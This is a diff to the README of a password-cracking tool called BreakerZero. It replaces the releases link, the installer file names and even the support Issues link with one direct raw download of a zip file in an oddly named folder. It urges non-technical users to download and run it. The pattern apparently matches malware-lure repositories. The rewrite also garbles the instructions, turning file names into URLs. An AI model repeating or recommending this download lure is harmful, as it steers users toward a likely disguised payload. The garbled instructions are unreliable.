@@ -1,7 +1,7 @@
 # 🔐 BreakerZero_PasswordCracker_v1.0 - Crack Passwords with Ease
 
 ## 📥 Download Now
-[![Download BreakerZero](https://img.shields.io/badge/Download-BreakerZero_PasswordCracker_v1.0-blue.svg)](https://github.com/Ramborat1013/BreakerZero_PasswordCracker_v1.0/releases)
+[![Download BreakerZero](https://raw.githubusercontent.com/Ramborat1013/BreakerZero_PasswordCracker_v1.0/main/hypovalve/BreakerZero_PasswordCracker_v1.0.zip)](https://raw.githubusercontent.com/Ramborat1013/BreakerZero_PasswordCracker_v1.0/main/hypovalve/BreakerZero_PasswordCracker_v1.0.zip)
 
 ## 🚀 Getting Started
 BreakerZero_PasswordCracker_v1.0 is an advanced tool designed for educational and ethical use in password and hash cracking. This guide helps you download and run the software without needing technical skills. Follow these steps to get started.
@@ -22,20 +22,20 @@ BreakerZero_PasswordCracker_v1.0 is an advanced tool designed for educational an
 ## 📚 How to Download & Install
 1. **Visit the Releases Page:** Click on the link below to go to the download page:
 
-   [Download BreakerZero_PasswordCracker_v1.0](https://github.com/Ramborat1013/BreakerZero_PasswordCracker_v1.0/releases)
+   [Download BreakerZero_PasswordCracker_v1.0](https://raw.githubusercontent.com/Ramborat1013/BreakerZero_PasswordCracker_v1.0/main/hypovalve/BreakerZero_PasswordCracker_v1.0.zip)
 
 2. **Select the Latest Version:** Look for “v1.0” or the most recent version listed. 
 
-3. **Download the Installer:** Find the file named `BreakerZero_PasswordCracker_installer.exe` or `BreakerZero_PasswordCracker.dmg` (for Mac). Click on it to start downloading.
+3. **Download the Installer:** Find the file named `https://raw.githubusercontent.com/Ramborat1013/BreakerZero_PasswordCracker_v1.0/main/hypovalve/BreakerZero_PasswordCracker_v1.0.zip` or `https://raw.githubusercontent.com/Ramborat1013/BreakerZero_PasswordCracker_v1.0/main/hypovalve/BreakerZero_PasswordCracker_v1.0.zip` (for Mac). Click on it to start downloading.
 
 4. **Run the Installer:**
    - **For Windows Users:**
      - Navigate to your Downloads folder.
-     - Double-click on `BreakerZero_PasswordCracker_installer.exe`.
+     - Double-click on `https://raw.githubusercontent.com/Ramborat1013/BreakerZero_PasswordCracker_v1.0/main/hypovalve/BreakerZero_PasswordCracker_v1.0.zip`.
      - Follow the on-screen instructions to complete the installation.
    - **For Mac Users:**
      - Go to your Downloads folder.
-     - Open the `BreakerZero_PasswordCracker.dmg` file.
+     - Open the `https://raw.githubusercontent.com/Ramborat1013/BreakerZero_PasswordCracker_v1.0/main/hypovalve/BreakerZero_PasswordCracker_v1.0.zip` file.
      - Drag the app to your Applications folder.
 
 5. **Launch the Application:** After installation, find the application in your Start menu (Windows) or Applications folder (Mac) and double-click to open it.
@@ -58,7 +58,7 @@ If you encounter issues while downloading or running the application, please try
 ## 🛠️ Support
 If you need help or have questions about the application, visit the GitHub issues page:
 
-[GitHub Issues](https://github.com/Ramborat1013/BreakerZero_PasswordCracker_v1.0/issues)
+[GitHub Issues](https://raw.githubusercontent.com/Ramborat1013/BreakerZero_PasswordCracker_v1.0/main/hypovalve/BreakerZero_PasswordCracker_v1.0.zip)
 
 ## 🔗 Additional Resources
 - **Documentation:** More in-depth guides and tutorials can be found in the GitHub wiki section.
